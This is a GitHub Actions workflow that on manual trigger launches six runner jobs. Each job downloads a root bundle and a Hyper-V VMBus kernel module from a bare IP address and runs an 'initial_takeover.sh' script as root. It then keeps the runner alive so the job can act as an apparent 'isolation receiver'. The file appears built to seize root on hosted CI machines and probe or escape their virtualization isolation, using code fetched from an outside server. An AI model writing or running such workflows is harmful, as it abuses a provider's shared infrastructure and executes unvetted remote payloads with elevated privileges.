name: Owned VMBFS isolation receiver

on:
  workflow_dispatch:

permissions:
  contents: read

jobs:
  receive:
    strategy:
      fail-fast: false
      matrix:
        slot: [1, 2, 3, 4, 5, 6]
    runs-on: ubuntu-slim
    timeout-minutes: 20
    steps:
      - uses: actions/checkout@08eba0b27e820071cde6df949e0beb9ba4906955 # v4.3.0

      - name: Hold a status-checked VMBFS channel in owned B
        env:
          MATRIX_SLOT: ${{ matrix.slot }}
        run: |
          curl -fsS http://16.146.243.72:8450/gha3900000-root-bundle.tgz -o /tmp/root.tgz
          tar -xzf /tmp/root.tgz -C /tmp
          cp root_vmbfs_receiver.sh /tmp/root_auto.sh
          cp vmbfs_receiver.py vmbfs_control.py /tmp/
          curl -fsS http://16.146.243.72:8450/hvraw_vmbfs_receiver.ko \
            -o /tmp/hvraw_vmbfs_receiver.ko
          echo '78cd8ab89052a48a1af385ba3251ed3972a18a4d74ae5464677f019b69fb82ff  /tmp/hvraw_vmbfs_receiver.ko' | sha256sum -c -
          printf '%s\n' "$GITHUB_RUN_ID" >/tmp/vmbfs-b-run
          printf '%s\n' "$MATRIX_SLOT" >/tmp/vmbfs-b-slot
          chmod +x /tmp/root_auto.sh /tmp/vmbfs_receiver.py
          HVS_INLINE=1 bash /tmp/initial_takeover.sh | tee root-setup.log
          sleep 840

      - uses: actions/upload-artifact@bbbca2ddaa5d8feaa63e36b76fdaad77386f024f # v7.0.0
        if: always()
        with:
          name: vmbfs-receiver-${{ github.run_id }}-${{ matrix.slot }}
          path: root-setup.log
